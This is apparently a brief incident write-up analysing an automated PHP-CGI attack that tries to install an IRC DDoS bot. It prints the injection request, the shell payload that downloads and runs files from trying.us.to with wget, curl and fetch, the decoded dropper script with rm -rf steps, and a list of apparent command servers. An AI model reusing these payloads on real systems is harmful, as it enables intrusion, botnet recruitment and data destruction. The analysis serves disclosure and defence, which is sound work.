# Info
Recently discovered automatic attack on our servers.
It was an attempt to upload IRC bot node for IRC DDoS we guess. (::)
We don't know how to call this artifact.

# Flow
Requests came in the following form

```sh
GET:
-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.force_redirect=0 -d cgi.redirect_status_env=0 -d auto_prepend_file=php://input -n = u''

POST:
?> = u''
chmod  x seed  = u''
wget trying.us.to/seed.jpg  = u''
./seed   = u''
tar -xzvf seed.jpg  = u''
rm -rf * ") = u''
fetch http://trying.us.to/seed.jpg  = u''
<? system("cd /tmp  = u''
curl -O http://trying.us.to/seed.jpg  = u''
```

## seed.jpg
Human readable format of seed.jpg
```sh
#!/bin/bash
cd /var/tmp/;
wget trying.us.to/index.htm;
curl -O http://trying.us.to/index.htm;
fetch http://trying.us.to/index.htm;
tar -xzvf index.htm;
rm -rf index.htm;
perl /var/tmp/libssl3.so.2;
rm -rf *;
wget trying.us.to/stats.php;
fetch http://trying.us.to/stats.php;
curl -O http://trying.us.to/stats.php;
tar -xzvf stats.php;
rm -rf stats.php;
cd .d;
./autorun
```

## libssl3.so.2 masking perl control utility
So it is just a CLI utility which accepts parameters and tries to execute target task.

# Hacked nodes
Potential hacked machines lists are in the following files
1. `d/bang.txt`
2. `d/shiet.txt`

# Possible command nodes
```sh
server 66.255.200.3 80
server antiq.shit.la 80
server antiq.shit.la 6667
server antiq.shit.la 9999
server antiq.evils.in 6667
server antiq.evils.in 9999
server antiq.evils.in 80
server antiq.scifi.ro 80
server antiq.scifi.ro 6667
server antiq.scifi.ro 9999
```

# Summary
Authors didn't even bother to strip messages and hide sensitive information.
IRC logins and channel names present in settings files as well as C/C++ sources.
